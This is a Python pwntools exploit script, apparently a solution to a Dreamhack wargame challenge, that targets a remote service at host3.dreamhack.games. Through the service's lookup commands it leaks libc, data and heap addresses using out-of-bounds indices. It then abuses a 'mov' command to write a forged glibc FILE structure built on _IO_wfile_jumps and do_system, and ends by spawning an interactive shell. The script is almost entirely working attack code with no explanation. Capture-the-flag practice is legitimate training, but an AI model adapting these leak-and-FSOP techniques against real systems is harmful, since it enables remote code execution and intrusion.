from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 15073
r = remote(HOST, PORT)

def lookup_query(idx):
    r.sendlineafter(b': ', b'lookup_query')
    r.sendlineafter(b': ', b'%d'%idx)

def lookup_reg(idx):
    r.sendlineafter(b': ', b'lookup_register')
    r.sendlineafter(b': ', b'%d'%idx)

def mov(src, dest):
    r.sendlineafter(b': ', b'mov')
    r.sendlineafter(b': ', src)
    r.sendlineafter(b': ', dest)


lookup_reg(-0xf)
r.recvuntil(b'contains ')
upper = int(r.recvline().strip())
lookup_reg(-0x10)
r.recvuntil(b'contains ')
lower = int(r.recvline().strip())
libc = ((upper << 32) | lower) - 0x21a6a0


lookup_query(-0x17)
r.recvuntil(b'contains ')
data = u64(r.recvline().strip().ljust(8, b'\x00'))-8

ptr = data + 0x60
reg = data + 0x80
query = data + 0xc0

mov(b'0XAAAAAA', b'0')

lookup_reg((query - reg) // 4)
r.recvuntil(b'contains ')
lower = int(r.recvline().strip()) & 0xffffffff
lookup_reg((query - reg) // 4 + 1)
r.recvuntil(b'contains ')
upper = int(r.recvline().strip())
heap = (upper << 32) | lower

target = data + 0x8c0
mov(str((heap+0x20-reg) // 4).encode(), str((target-reg) // 4).encode())
heap += 0x220

file = target

def write(heap, payload, target):
    cnt = 0
    local_heap = heap
    for i in range(len(payload) // 4):
        data = payload[cnt:cnt+4]
        if u32(data) == 0:
            mov(b'150', str((target-reg) // 4 + i).encode())
            cnt += 4
            local_heap += 0x110
            continue
        if u32(data) == u32(p64(libc)[4:]):
            mov(b'-15', str((target-reg) // 4 + i).encode())
            cnt += 4
            local_heap += 0x110
            continue
        if u32(data) == u32(p64(ptr)[4:]):
            mov(b'-29', str((target-reg) // 4 + i).encode())
            cnt += 4
            local_heap += 0x110
            continue

        mov(b'0X' + data, b'0')
        mov(str((local_heap+0x20-reg) // 4).encode(), str((target-reg) // 4 + i).encode())
        local_heap += 0x220
        cnt += 4

system = libc+0x50d60
do_system = libc+0x508f0
_IO_wfile_jumps = libc+0x2160c0

payload = flat({
    0x0: b'dash;###',
    0x68: do_system,
    0x88: file+0x100,
    0xa0: file,
    0xd8: _IO_wfile_jumps,
    0xe0: file,
},filler=b'\x00')
write(heap, payload, file)

write(heap+17680, p64(file), reg-0x40)
print(hex(file+0x100))
r.sendlineafter(b': ', b'4')

r.interactive()